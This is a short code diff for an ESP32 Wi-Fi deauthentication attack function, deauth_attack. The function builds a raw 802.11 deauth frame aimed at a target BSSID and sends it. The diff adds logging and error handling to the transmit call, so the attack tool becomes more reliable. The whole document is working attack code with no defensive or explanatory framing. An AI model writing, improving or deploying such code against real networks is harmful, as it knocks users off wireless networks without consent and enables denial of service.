@@ -1,5 +1,8 @@
 #include "esp_wifi.h"
 #include <string.h>
+#include "esp_log.h"
+
+static const char *TAG = "DEAUTH";
 
 void deauth_attack(uint8_t *bssid) {
     uint8_t frame[26] = {
@@ -11,5 +14,9 @@ void deauth_attack(uint8_t *bssid) {
     };
     memcpy(&frame[10], bssid, 6);
     memcpy(&frame[16], bssid, 6);
-    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
+    
+    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
+    if (ret != ESP_OK) {
+        ESP_LOGW(TAG, "Failed to send deauth: %d", ret);
+    }
 }
